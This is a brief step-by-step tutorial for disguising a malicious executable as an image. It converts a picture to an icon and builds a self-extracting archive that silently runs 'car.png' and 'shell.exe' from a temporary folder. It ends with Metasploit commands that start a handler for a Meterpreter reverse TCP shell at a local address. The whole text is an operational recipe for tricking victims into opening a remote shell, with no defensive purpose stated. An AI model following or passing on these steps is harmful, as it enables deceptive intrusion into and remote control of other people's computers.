
## Making our payload to open an Image

	
		Things needed:
		
			-> an image file
			
			-> the actual payload
			
			
			
## Convert the image file to an icon
	
		go to this link
		
		-> https://convertio.co/png-ico/
		
		
		upload the img and convert it to an icon
		
		

## Merging the img and the payload
	
			-> Select both img and the payload 
			
			-> Create archive
			
			-> Archive Format: zip
		
			-> Create SFX archive
			
			-> Change the name
			
			-> Advanced 
			
			-> SFX options
			
			-> Update: extract and update files
			
			-> Overwrite: overwrite all files
			
			-> Text and Icon: Load SFX icon from file
			
			->  Browse
			
			-> find the .ico file
			
			-> Modes: Hide all and tick mark on Unpack to temporary folder
			
			-> Setup: 
					
					-> Run after extraction: 
														car.png
														shell.exe
			-> ok 
			
			-> ok
			
			
			
			
			
## Start the listener

		-> msfconsole
		
		-> use exploit/multi/handler
		
		-> set payload windows/meterpreter/reverse_tcp
		
		-> set LHOST 192.168.10.3
		
		-> set LPORT 5555

		
					
					
